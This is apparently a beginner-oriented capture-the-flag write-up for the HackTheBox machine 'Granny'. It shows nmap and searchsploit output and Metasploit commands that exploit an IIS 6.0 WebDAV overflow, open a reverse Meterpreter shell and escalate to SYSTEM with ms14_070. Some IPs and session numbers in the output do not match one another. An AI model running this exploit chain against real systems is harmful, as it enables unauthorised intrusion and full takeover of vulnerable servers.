---
layout: post
title:  "HackTheBox - Granny"
date:   2017-07-26 00:00:00 +0100
categories: [hackthebox]
description: Solutions for HackTheBox Granny
image:
  feature: granny.jpg
  credit:
  creditlink:
---
This writeup details attacking the machine Granny (10.10.10.15) on [HackTheBox](www.hackthebox.eu).

I will write this piece describing as many elements of the process as possible, assuming the reader to be just starting out in the field.  Further writeups aren't going to go into as much detail but if you're brand new to a lot of these tools, this will give you a good overview.

Scanning
---------
First things first, we know the IP so we want to discover what services are open on the remote box.  To do this we have to scan the ports of the remote device.  Nmap is basically the standard for this kind of engagement so here we go.

```bash
root@kali:~/Desktop/htb_connection# nmap -A 10.10.10.15 
  
Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-05-26 10:59 BST 
Nmap scan report for 10.10.10.15 
Host is up (0.26s latency). 
Not shown: 999 filtered ports 
PORT   STATE SERVICE VERSION 
80/tcp open  http    Microsoft IIS httpd 6.0 
| http-methods:  
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT 
|_http-server-header: Microsoft-IIS/6.0 
|_http-title: Error 
| http-webdav-scan:  
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK 
|   Server Type: Microsoft-IIS/6.0 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
|   WebDAV type: Unkown 
|_  Server Date: Fri, 26 May 2017 08:56:37 GMT 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 
Device type: general purpose 
Running (JUST GUESSING): Microsoft Windows 2003|XP|2008 (92%) 
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_server_2008::sp2 
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 - SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows XP SP2 or Windows Server 2003 SP2 (91%), Microsoft Windows Server 2003 R2 SP2 (88%), Microsoft Windows Server 2003 SP1 or R2 (88%), Microsoft Windows 2003 R2 (88%), Microsoft Windows Server 2003 (88%), Microsoft Windows Server 2003 SP1 or SP2 (86%), Microsoft Windows XP SP2 (86%), Microsoft Windows Server 2008 Enterprise SP2 (86%) 
No exact OS matches for host (test conditions non-ideal). 
Network Distance: 2 hops 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 
  
TRACEROUTE (using port 80/tcp) 
HOP RTT       ADDRESS 
1   382.68 ms 10.10.12.1 
2   382.84 ms 10.10.10.15 
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 21.81 seconds 
```
The "-A" flag applied here just tells nmap to run all it's scripts on the target machine, which gives us a lot more information from the resultant open ports.  This one is fairly simple and we see that only port 80 is open.

From this there's some very interesting information we see immediately, firstly it's running a very outdated version of Windows IIS, in this case 6.0 and it's an old windows version.  In all likelihood this is going to be absolutely full of vulnerabilities we can exploit.

So lets have a search for some vulnerabilities using the Kali Linux searchsploit tool.

```bash
root@kali:~/reboare.github.io/_posts# searchsploit IIS 6.0
-------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                            |  Path
                                                                          | (/usr/share/exploitdb/platforms)
-------------------------------------------------------------------------- ----------------------------------
Microsoft IIS 6.0 - (/AUX/.aspx) Remote Denial of Service                 | ./windows/dos/3965.pl
Microsoft IIS 6.0 WebDAV - Remote Authentication Bypass                   | ./windows/remote/8704.txt
Microsoft IIS 6.0 WebDAV - Remote Authentication Bypass Exploit (Patch)   | ./windows/remote/8754.patch
Microsoft IIS 6.0 WebDAV - Remote Authentication Bypass Exploit (PHP)     | ./windows/remote/8765.php
Microsoft IIS 6.0 WebDAV - Remote Authentication Bypass Exploit (Perl)    | ./windows/remote/8806.pl
Microsoft IIS 5.0/6.0 FTP Server - Remote Stack Overflow Exploit (Windows | ./windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server (Stack Exhaustion) Denial of Service     | ./windows/dos/9587.txt
Microsoft IIS 6.0 ASP - Stack Overflow (Stack Exhaustion) Denial of Servi | ./windows/dos/15167.txt
Microsoft IIS 6.0 / 7.5 (+ PHP) - Multiple Vulnerabilities                | ./windows/remote/19033.txt
-------------------------------------------------------------------------- ----------------------------------
```

There are a variety of different vulnerabilities, and a number referencing WebDAV.  Looking back at nmap we see that http-webdav is indeed enabled so it seems likely that one of these will indeed work.  

Since it's a windows machine, I'm in favour of making my life as easy as possible, so the first thing I do is look to see if there are metasploit module available.  Metasploit is a toolkit for exploitation which includes exploits for infiltration and exploitation, so if it's available it makes the job of rooting a lot of these boxes much easier (some would say too easy).

```bash
root@kali:~/reboare.github.io/_posts# msfconsole -q
msf > search webdav
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                                      Disclosure Date  Rank       Description
   ----                                                      ---------------  ----       -----------
   auxiliary/scanner/http/dir_webdav_unicode_bypass                           normal     MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner
   auxiliary/scanner/http/ms09_020_webdav_unicode_bypass                      normal     MS09-020 IIS6 WebDAV Unicode Authentication Bypass
   auxiliary/scanner/http/webdav_internal_ip                                  normal     HTTP WebDAV Internal IP Scanner
   auxiliary/scanner/http/webdav_scanner                                      normal     HTTP WebDAV Scanner
   auxiliary/scanner/http/webdav_website_content                              normal     HTTP WebDAV Website Content Scanner
----------------------------SNIP-----------------------------
   exploit/windows/http/sap_host_control_cmd_exec            2012-08-14       average    SAP NetWeaver HostControl Command Injection
   exploit/windows/http/xampp_webdav_upload_php              2012-01-14       excellent  XAMPP WebDAV PHP Upload
   **exploit/windows/iis/iis_webdav_scstoragepathfromurl**       2017-03-26       manual      Microsoft IIS WebDav ScStoragePathFromUrl Overflow
   exploit/windows/iis/iis_webdav_upload_asp                 1994-01-01       excellent  Microsoft IIS WebDAV Write Access Code Execution
   exploit/windows/iis/ms03_007_ntdll_webdav                 2003-05-30       great      MS03-007 Microsoft IIS 5.0 WebDAV ntdll.dll Path Overflow
   exploit/windows/local/ms16_016_webdav                     2016-02-09       excellent  MS16-016 mrxdav.sys WebDav Local Privilege Escalation
   exploit/windows/misc/ibm_director_cim_dllinject           2009-03-10       excellent  IBM System Director Agent DLL Injection
   exploit/windows/misc/vmhgfs_webdav_dll_sideload           2016-08-05       normal     DLL Side Loading Vulnerability in VMware Host Guest Client Redirector
   exploit/windows/scada/ge_proficy_cimplicity_gefebt        2014-01-23       excellent  GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
   exploit/windows/ssl/ms04_011_pct                          2004-04-13       average    MS04-011 Microsoft Private Communications Transport Overflow
   post/windows/escalate/droplnk                                              normal     Windows Escalate SMB Icon LNK Dropper

```

In this we see a few, but based on the date and description, the best matching appears to be exploit/windows/iis/iis_webdav_scstoragepathfromurl, especially when we view [the description](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl).  This shows it targets Windows Server 2003 R2, which is a possibility for the OS if we look back at the nmap scan, and a rather high up one.  So in this case it doesn't look like it will hurt at all to give this exploit a try.

```bash
msf > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf exploit(iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                           yes       The target address
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2

```

Here, we've loaded the exploit into metasploit and viewed all the available options it has.  The only one missing is RHOST, and the others appears to be defaults applicable to most installations, so for now we'll just change RHOST to the correct IP, and exploit the vulnerability.

```bash
msf exploit(iis_webdav_scstoragepathfromurl) > set RHOST 10.10.10.15
RHOST => 10.10.10.15
msf exploit(iis_webdav_scstoragepathfromurl) > exploit

[*] Started reverse TCP handler on 10.10.15.51:4444 
[*] Sending stage (957487 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.15.51:4444 -> 10.10.10.15:1030) at 2017-07-31 18:53:43 +0100

meterpreter > 

```

So, running it we have a shell on the remote system.  But there's a slight problem, in that we can't seem to run any standard api commands such as getuid of getpid.  These aren't incredibly useful for just running the shell but they are absolutely vital for any post exploitation command to function.
```bash
meterpreter > getuid 
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```
So to fix this, one thing we can try is migrating the process of our shell to something else.  Sometimes, this can remove whatever restrictions have been placed on our shell.

So we background our shell, and use the post/windows/migrate module.

```bash
meterpreter > background
[*] Backgrounding session 1...
msf exploit(iis_webdav_scstoragepathfromurl) > use post/windows/manage/migrate 
msf post(migrate) > show options 
  
Module options (post/windows/manage/migrate): 
  
   Name     Current Setting  Required  Description 
   ----     ---------------  --------  ----------- 
   KILL     false            no        Kill original process for the session. 
   NAME                      no        Name of process to migrate to. 
   PID                       no        PID of process to migrate to. 
   SESSION                   yes       The session to run this module on. 
   SPAWN    true             no        Spawn process to migrate to. If name for process not given notepad.exe is used. 
```
So here we see that this module will spawn a notepad.exe process and migrate our shell to run within that process.  All we need to give is the name of our shell's session which we set to the background earlier.

```bash  
msf post(migrate) > set SESSION 1
SESSION => 1
msf post(migrate) > exploit 

[*] Running module against GRANNY 
[*] Current server process: rundll32.exe (2540) 
[*] Spawning notepad.exe process to migrate to 
[+] Migrating to 3072 
[+] Successfully migrated to process 3072 
[*] Post module execution completed 
msf post(migrate) > sessions 2 
[*] Starting interaction with 2... 
  
meterpreter > getuid 
Server username: NT AUTHORITY\NETWORK SERVICE 
```

Hurrah! It worked and we can now run common commands.  There's one other post module we want to use now, which will probe the remote box and look for ways we can elevate our privileges.  Right now we're just running as a network service user that can run commands but can't make sweeping changes to the machine.  We want complete control, also known as SYSTEM level privileges.  

To do this, we're going to be looking for privilege escalation vulnerabilities, and luckily there's a module in metasploit which can find them for us.

```bash
msf exploit(ms_ndproxy) > use post/multi/recon/local_exploit_suggester  
msf post(local_exploit_suggester) > show options 
 
Module options (post/multi/recon/local_exploit_suggester): 
 
   Name             Current Setting  Required  Description 
   ----             ---------------  --------  ----------- 
   SESSION                           yes       The session to run this module on. 
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits 
 
msf post(local_exploit_suggester) > set SESSION 1 
SESSION => 1 
msf post(local_exploit_suggester) > exploit 
 
[*] 10.10.10.14 - Collecting local exploits for x86/windows... 
[*] 10.10.10.14 - 36 exploit checks are being tried... 
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. 
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable. 
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. 
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated. 
[+] 10.10.10.14 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated. 
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. 
[*] Post module execution completed
```

So now we've got a number to try.  All that can really be done now is to go through the list meticulously and try every exploit.  Lets pick one and see how it fares.

```bash
msf post(migrate) > use exploit/windows/local/ms14_070_tcpip_ioctl 
msf exploit(ms14_070_tcpip_ioctl) > show options 
  
Module options (exploit/windows/local/ms14_070_tcpip_ioctl): 
  
   Name     Current Setting  Required  Description 
   ----     ---------------  --------  ----------- 
   SESSION                   yes       The session to run this module on. 
  
  
Exploit target: 
  
   Id  Name 
   --  ---- 
   0   Windows Server 2003 SP2 
  
  
msf exploit(ms14_070_tcpip_ioctl) > set SESSION 1
SESSION => 1
msf exploit(ms14_070_tcpip_ioctl) > exploit 
  
[*] Started reverse TCP handler on 192.168.161.134:4444  
[*] Storing the shellcode in memory... 
[*] Triggering the vulnerability... 
[*] Checking privileges after exploitation... 
[+] Exploitation successful! 
[*] Exploit completed, but no session was created.
```

This one claimed to be succesful but we didn't get a shell back which can indicate failure, but not always.  However, we forgot to set our local IP address to the correct subnet so it looks like that may be why it didn't give us back a shell.  Lets go back to our session to see if it's managed to elevate us.

```bash
msf exploit(ms14_070_tcpip_ioctl) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

There we go!  SYSTEM level privileges using metasploit. 
